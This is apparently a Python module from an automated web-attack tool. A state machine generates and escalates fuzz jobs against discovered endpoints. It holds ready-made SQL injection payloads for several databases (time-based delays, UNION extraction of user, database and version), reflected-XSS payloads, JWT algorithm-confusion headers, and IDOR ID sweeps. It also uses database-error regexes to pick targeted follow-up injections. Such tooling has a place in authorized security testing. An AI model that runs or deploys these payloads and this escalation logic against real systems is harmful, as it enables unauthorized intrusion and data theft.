from __future__ import annotations

import re
import uuid
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Iterator
from urllib.parse import parse_qs, urlparse


class State(Enum):
    RECON = auto()
    PROBE = auto()
    CONFIRM = auto()
    EXPLOIT = auto()
    REPORTED = auto()


@dataclass
class Endpoint:
    url: str
    params: list[str]
    score: float
    state: State = State.RECON
    findings: list[dict] = field(default_factory=list)


@dataclass
class FuzzJob:
    job_id: str
    url: str
    method: str
    payload: str
    param: str
    category: str
    notes: str = ""

    def to_dict(self) -> dict:
        return {
            "type": "fuzz_job",
            "job_id": self.job_id,
            "url": self.url,
            "method": self.method,
            "payload": self.payload,
            "param": self.param,
            "category": self.category,
            "notes": self.notes,
        }


_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}")
_NUMERIC_ID_RE = re.compile(r"(?<![a-z_/])(\d{1,10})(?![a-z_/])", re.IGNORECASE)

# DB error signatures -> DB type
_DB_ERRORS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"you have an error in your sql syntax", re.I), "mysql"),
    (re.compile(r"ORA-\d{5}:", re.I), "oracle"),
    (re.compile(r"pg_query\(\)|PSQLException|postgresql", re.I), "postgres"),
    (re.compile(r"microsoft sql server|mssql|unclosed quotation mark", re.I), "mssql"),
    (re.compile(r"SQLiteException|sqlite3\.OperationalError", re.I), "sqlite"),
    (re.compile(r"syntax error.*near", re.I), "generic_sql"),
]

_REFLECTION_RE = re.compile(r"<script>alert\(1\)</script>|ANTIGRAVITY_XSS_PROBE", re.I)


_SQLI_PAYLOADS: dict[str, list[str]] = {
    "mysql": [
        "' AND SLEEP(5)--",
        "' UNION SELECT user(),database(),version()--",
        "' OR 1=1 LIMIT 1--",
    ],
    "postgres": [
        "'; SELECT pg_sleep(5)--",
        "' UNION SELECT current_user,current_database(),version()--",
    ],
    "oracle": [
        "' OR 1=1--",
        "' UNION SELECT NULL FROM DUAL--",
        "AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL)=1--",
    ],
    "mssql": [
        "';WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT @@version,NULL,NULL--",
    ],
    "sqlite": [
        "' OR 1=1--",
        "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
    ],
    "generic_sql": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
    ],
}

# JWT attack payloads (algorithm confusion)
_JWT_PAYLOADS: list[dict] = [
    {
        "payload": '{"alg":"none"}',
        "category": "jwt_alg_none",
        "notes": "Algorithm confusion: none",
    },
    {
        "payload": '{"alg":"HS256"}',
        "category": "jwt_rs256_hs256",
        "notes": "RS256->HS256 confusion",
    },
]

# Context-aware XSS payloads for confirmed reflection
_XSS_CONTEXT_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg/onload=alert(document.domain)>",
    "';alert(document.domain)//",
    '"><script>alert(document.domain)</script>',
]


class StateMachine:
    # Stateful exploitation tracker.
    # Call process_node() on every node event,
    # Call process_result() on every fuzz_result event.

    def __init__(self) -> None:
        self._endpoints: dict[str, Endpoint] = {}

    def process_node(self, node: dict) -> list[FuzzJob]:
        # Process a new endpoint node and return initial fuzz jobs.

        raw_url = node.get("url", "")
        params = node.get("params", [])
        score = node.get("score", 1.0)

        ep = Endpoint(url=raw_url, params=params, score=score, state=State.RECON)
        self._endpoints[raw_url] = ep

        jobs: list[FuzzJob] = []

        # Transition to PROBE - generate discovery jobs
        ep.state = State.PROBE

        # For each parameter, enqueue one probe per category
        for param in params:
            # XSS probe
            jobs.append(
                FuzzJob(
                    job_id=uuid.uuid4().hex[:12],
                    url=raw_url,
                    method="GET",
                    payload="<script>alert(1)</script>",
                    param=param,
                    category="xss_probe",
                    notes=f"XSS reflection probe on {param}",
                )
            )

            # SQLi error probe
            jobs.append(
                FuzzJob(
                    job_id=uuid.uuid4().hex[:12],
                    url=raw_url,
                    method="GET",
                    payload="'",
                    param=param,
                    category="sqli_error",
                    notes=f"SQLi error probe on {param}",
                )
            )

            # IDOR probe
            parsed = urlparse(raw_url)
            qs = parse_qs(parsed.query)
            val = qs.get(param, [""])[0]
            if val.isdigit():
                for delta in (-1, 0, 1, 2, 1000):
                    jobs.append(
                        FuzzJob(
                            job_id=uuid.uuid4().hex[:12],
                            url=raw_url,
                            method="GET",
                            payload=str(int(val) + delta),
                            param=param,
                            category="idor",
                            notes=f"IDOR sweep on {param} ({val} + {delta})",
                        )
                    )

        return jobs

    def process_result(self, result: dict, response_body: str = "") -> list[FuzzJob]:
        # Analyse a fuzz result and return follow-up jobs.

        jobs: list[FuzzJob] = []

        status = result.get("status", 0)
        reflect = result.get("reflect", False)
        timing_hit = result.get("timing_hit", False)
        job_id = result.get("job_id", "")

        # Check for WAF block (403/429 with no body reflection)
        if status in (403, 429):
            return jobs  # Handled by rate limiter; no follow-up

        # Reflection confirmed -> queue context-aware XSS
        if reflect:
            # Find original endpoint from job_id prefix? use a generic URL approach
            for payload in _XSS_CONTEXT_PAYLOADS:
                jobs.append(
                    FuzzJob(
                        job_id=uuid.uuid4().hex[:12],
                        url="",  # caller should supply original URL
                        method="GET",
                        payload=payload,
                        param="",
                        category="xss_confirm",
                        notes="XSS context-aware follow-up after reflection",
                    )
                )

        # Timing hit -> time-based SQLi confirmed
        if timing_hit:
            for payload in _SQLI_PAYLOADS["generic_sql"]:
                jobs.append(
                    FuzzJob(
                        job_id=uuid.uuid4().hex[:12],
                        url="",
                        method="GET",
                        payload=payload,
                        param="",
                        category="sqli_time",
                        notes="Time-based SQLi follow-up after timing oracle hit",
                    )
                )

        # DB error detected in body -> targeted SQLi
        if response_body:
            for pattern, db_type in _DB_ERRORS:
                if pattern.search(response_body):
                    for payload in _SQLI_PAYLOADS.get(
                        db_type, _SQLI_PAYLOADS["generic_sql"]
                    ):
                        jobs.append(
                            FuzzJob(
                                job_id=uuid.uuid4().hex[:12],
                                url="",
                                method="GET",
                                payload=payload,
                                param="",
                                category=f"sqli_{db_type}",
                                notes=f"Targeted SQLi for detected DB: {db_type}",
                            )
                        )
                    break

            # JWT token in response -> auth attacks
            if _JWT_RE.search(response_body):
                for jwt_attack in _JWT_PAYLOADS:
                    jobs.append(
                        FuzzJob(
                            job_id=uuid.uuid4().hex[:12],
                            url="",
                            method="GET",
                            payload=jwt_attack["payload"],
                            param="Authorization",
                            category=jwt_attack["category"],
                            notes=jwt_attack["notes"],
                        )
                    )

        return jobs

    @property
    def endpoint_count(self) -> int:
        return len(self._endpoints)

    @property
    def endpoints(self) -> dict[str, Endpoint]:
        return self._endpoints
